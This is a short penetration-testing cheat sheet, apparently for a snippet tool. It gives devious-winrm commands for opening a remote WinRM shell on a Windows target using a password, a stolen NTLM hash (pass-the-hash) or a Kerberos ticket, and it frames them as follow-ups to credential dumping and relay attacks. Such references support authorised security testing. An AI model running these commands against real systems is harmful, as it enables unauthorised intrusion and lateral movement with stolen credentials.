# Devious-WinRM

## devious-winrm - winrm - remote

### password

Read password with Devious-WinRM.

Open a WinRM shell on the target with cleartext password auth. devious-winrm is a modern evil-winrm replacement with better PSReadline handling.

```sh title:"Devious WinRM Read Password"
devious-winrm -u $user -p $pass $rhost_name
```
<!-- cheat
import domain_ip
import users
import passwords
var rhost_name
-->

### ntlm or lm:ntlm hash

Dump NTLM or lm:ntlm hash with Devious-WinRM.

WinRM shell authenticated via NT hash (pass-the-hash). Use after dumping SAM/NTDS or after hash capture from SMB relay.

```sh title:"Devious WinRM Dump NTLM or Lm:ntlm Hash"
devious-winrm -u $user -H $hash $rhost_name
```
<!-- cheat
import domain_ip
import users
import passwords
var hash
var rhost_name
-->

### kerberos

Read kerberos with Devious-WinRM.

WinRM shell using a ccache TGT (`-k` reads `KRB5CCNAME`). Required when only Kerberos auth is enabled or when passing tickets after S4U / coercion.

```sh title:"Devious WinRM Read Kerberos"
devious-winrm -u $user -k --dc $rhost_name $rhost_name
```
<!-- cheat
import domain_ip
import users
import passwords
var rhost_name
-->
